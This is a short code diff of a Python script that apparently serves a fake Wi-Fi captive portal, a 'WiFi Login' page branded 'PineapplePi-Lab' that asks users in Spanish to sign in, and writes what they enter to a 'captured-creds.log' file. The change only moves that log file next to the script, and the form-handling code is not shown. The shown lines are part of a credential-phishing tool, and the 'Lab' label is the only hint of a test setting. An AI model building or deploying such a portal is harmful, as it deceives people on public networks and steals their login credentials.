@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-import http.server, datetime
-LOG="/opt/pineapple/captured-creds.log"
+import http.server, datetime, os
+LOG=os.path.join(os.path.dirname(os.path.abspath(__file__)),"captured-creds.log")
 PAGE=b'''<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
 <title>WiFi Login</title><body style="font-family:sans-serif;max-width:340px;margin:50px auto;text-align:center">
 <h2>PineapplePi-Lab</h2><p>Inicia sesion para acceder a Internet</p>
